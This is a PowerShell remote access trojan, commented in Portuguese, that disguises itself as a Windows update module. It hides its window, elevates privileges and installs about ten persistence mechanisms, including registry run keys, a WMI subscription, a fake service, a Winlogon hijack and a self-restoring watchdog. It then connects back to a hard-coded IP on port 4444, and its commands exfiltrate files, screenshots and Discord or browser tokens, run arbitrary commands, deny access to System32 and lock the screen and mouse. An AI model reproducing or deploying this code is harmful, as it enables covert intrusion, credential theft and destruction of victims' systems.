<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - System Level Integration
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURAÇÕES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4444
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"

# ===== MUTEX - EVITA MÚLTIPLAS INSTÂNCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) {
    exit
}

# ===== ELEVAR PRIVILÉGIOS =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNÇÕES PRINCIPAIS =====
function Get-ScreenCapture {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    return [Convert]::ToBase64String($ms.ToArray())
}

function Move-Mouse { 
    param($x, $y)
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
}

function Click-Mouse {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}

function Get-FileList {
    param($Path)
    Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
        }
    } | ConvertTo-Json -Compress
}

function Download-File {
    param($Path)
    if (Test-Path $Path) {
        $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
        return "FILE:$content"
    }
    return "FILE_NOT_FOUND"
}

function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

function Get-DiscordToken {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            Get-ChildItem $path -ErrorAction SilentlyContinue | ForEach-Object {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                $matches = $regex.Matches($content)
                foreach ($match in $matches) {
                    $tokens += $match.Value
                }
            }
        }
    }
    
    $tokens = $tokens | Select-Object -Unique
    return "TOKENS:" + ($tokens -join "`n")
}

function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

function Black-Screen {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Lock-Mouse {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseTrap {
                [DllImport("user32.dll")]
                public static extern bool SetCursorPos(int x, int y);
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                public struct RECT { public int left, top, right, bottom; }
                public static void Trap() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                    ClipCursor(ref rect);
                }
            }
"@
        [MouseTrap]::Trap()
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Power-Control {
    param($Action)
    switch ($Action) {
        "shutdown" { Stop-Computer -Force }
        "reboot" { Restart-Computer -Force }
    }
    return "POWER_$Action"
}

# ===== PERSISTÊNCIA MÁXIMA (NEM FORMATANDO SAI) =====
function Install-MaximumPersistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    $exePath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.exe"
    
    # Criar pasta se não existir
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    
    # Copiar script para local escondido
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    
    # ===== 1. TAREFA AGENDADA (INÍCIO DO WINDOWS) =====
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
    
    # ===== 2. REGISTRO DO WINDOWS (RUN) =====
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    
    # ===== 3. REGISTRO DO WINDOWS (RUNONCE) =====
    $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    
    # ===== 4. WMI EVENT SUBSCRIPTION (MAIS PROFUNDO) =====
    try {
        $filterArgs = @{
            Name = "$installName-Filter"
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
        }
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
        
        $consumerArgs = @{
            Name = "$installName-Consumer"
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        }
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
        
        $bindingArgs = @{ Filter = $filter; Consumer = $consumer }
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
    } catch { }
    
    # ===== 5. WINDOWS SERVICES (CRIA UM SERVIÇO FALSO) =====
    try {
        New-Service -Name $installName -BinaryPathName "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name $installName -ErrorAction SilentlyContinue
    } catch { }
    
    # ===== 6. BOOT KIT (INICIALIZAÇÃO ANTES DO WINDOWS) =====
    try {
        $bootPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute"
        $currentValue = (Get-ItemProperty -Path $bootPath -Name "BootExecute" -ErrorAction SilentlyContinue).BootExecute
        if ($currentValue -isnot [array]) { $currentValue = @() }
        $newValue = $currentValue + "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        Set-ItemProperty -Path $bootPath -Name "BootExecute" -Value $newValue -Force
    } catch { }
    
    # ===== 7. POLÍTICAS DE GRUPO (GPO) =====
    try {
        $gpoPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0"
        New-Item -Path $gpoPath -Force | Out-Null
        Set-ItemProperty -Path $gpoPath -Name "Script" -Value $scriptPath -Force
        Set-ItemProperty -Path $gpoPath -Name "Parameters" -Value "" -Force
    } catch { }
    
    # ===== 8. WINDOWS LOGON SCRIPTS =====
    try {
        $logonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        Set-ItemProperty -Path $logonPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"," -Force
    } catch { }
    
    # ===== 9. OCULTAR ARQUIVO =====
    attrib +h +s +r $scriptPath
    
    # ===== 10. AUTO-REPLICAÇÃO (SE APAGAR, COPIA DE VOLTA) =====
    $watchdogScript = @"
    `$watcher = New-Object System.IO.FileSystemWatcher
    `$watcher.Path = '$env:ProgramData\Microsoft\Windows\Caches'
    `$watcher.Filter = '$installName.ps1'
    `$watcher.EnableRaisingEvents = `$true
    `$action = { 
        Start-Sleep -Seconds 5
        Copy-Item '$scriptPath' `$Event.SourceEventArgs.FullPath -Force
        attrib +h +s +r `$Event.SourceEventArgs.FullPath
    }
    Register-ObjectEvent `$watcher "Deleted" -Action `$action
    while(`$true) { Start-Sleep 10 }
"@
    $watchdogScript | Out-File "$env:ProgramData\Microsoft\Windows\Caches\watchdog.ps1" -Force
    
    # Iniciar watchdog
    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -File `"$env:ProgramData\Microsoft\Windows\Caches\watchdog.ps1`"" -WindowStyle Hidden
    
    return "PERSISTENCE_INSTALLED"
}

# ===== VERIFICAR SE JÁ ESTÁ INSTALADO =====
if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-MaximumPersistence
}

# ===== CONEXÃO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Envia identificação
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            
            switch -Wildcard ($cmd) {
                "screenshot" { 
                    $result = Get-ScreenCapture
                    $writer.WriteLine("SCREEN:$result") 
                }
                "move *" { 
                    $pos = $cmd.Replace("move ","").Split(" ")
                    Move-Mouse $pos[0] $pos[1]
                    $writer.WriteLine("OK") 
                }
                "click" { 
                    Click-Mouse
                    $writer.WriteLine("OK") 
                }
                "ls *" { 
                    $path = $cmd.Replace("ls ","")
                    $result = Get-FileList $path
                    $writer.WriteLine($result) 
                }
                "download *" { 
                    $file = $cmd.Replace("download ","")
                    $result = Download-File $file
                    $writer.WriteLine($result) 
                }
                "exec *" { 
                    $exe = $cmd.Replace("exec ","")
                    $result = Execute-Command $exe
                    $writer.WriteLine($result) 
                }
                "block_system32" { 
                    $result = Block-System32
                    $writer.WriteLine($result) 
                }
                "black_screen" { 
                    $result = Black-Screen
                    $writer.WriteLine($result) 
                }
                "lock_mouse" { 
                    $result = Lock-Mouse
                    $writer.WriteLine($result) 
                }
                "shutdown" { 
                    $result = Power-Control "shutdown"
                    $writer.WriteLine($result) 
                }
                "reboot" { 
                    $result = Power-Control "reboot"
                    $writer.WriteLine($result) 
                }
                "discord" { 
                    $result = Get-DiscordToken
                    $writer.WriteLine($result) 
                }
                "exit" { 
                    break 
                }
                default { 
                    $writer.WriteLine("Comando não reconhecido: $cmd") 
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
